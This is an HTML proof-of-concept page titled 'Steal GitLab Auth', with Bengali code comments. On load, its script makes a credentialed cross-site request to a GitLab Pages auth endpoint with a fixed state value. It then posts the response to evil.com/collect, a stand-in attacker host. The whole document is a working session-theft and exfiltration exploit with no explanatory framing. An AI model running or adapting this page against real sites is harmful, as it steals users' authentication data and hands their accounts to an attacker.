<!DOCTYPE html>
<html>
<head>
  <title>Steal GitLab Auth</title>
</head>
<body>
  <h1>Loading…</h1>
  <script>
    // অটোমেটেড GET রিকোয়েস্ট
    fetch(
      "https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==",
      {
        method: "GET",
        credentials: "include"  // কুকি/ক্রস-সাইট সেশন পাঠাবে
      }
    )
    .then(res => res.text())
    .then(text => {
      // চুরির পর ফলাফল own সার্ভারে POST
      return fetch("https://evil.com/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ data: text })
      });
    })
    .then(() => {
      document.body.innerHTML = "<h1>Done!</h1>";
    })
    .catch(err => {
      document.body.innerHTML = "<h1>Error:</h1><pre>" + err + "</pre>";
    });
  </script>
</body>
</html>
